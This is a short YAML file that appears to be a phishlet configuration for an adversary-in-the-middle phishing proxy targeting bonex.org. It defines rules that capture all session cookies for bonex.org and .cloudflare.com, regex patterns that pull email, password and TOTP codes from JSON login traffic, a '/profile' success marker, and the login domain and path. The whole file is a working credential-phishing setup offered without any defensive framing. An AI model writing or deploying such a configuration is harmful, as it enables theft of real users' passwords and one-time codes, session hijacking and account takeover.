auth_tokens:
  - domain: '.cloudflare.com'
    keys: ['.*,regexp']
  - domain: '.bonex.org'
    keys: ['.*,regexp']


#https://bonex.org/api/auth/local/signin

auth_urls:
  - "/profile"

credentials:
  username:
    key: 'email'
    search: '"email":"([^"]*)'
    type: 'json'
  password:
    key: 'password'
    search: '"password":"([^"]*)'
    type: 'json'
  custom:
    - key: 'totp'
      search: '"totp":"([^"]*)'
      type: 'json'

login:
  domain: 'bonex.org'
  path: '/login'
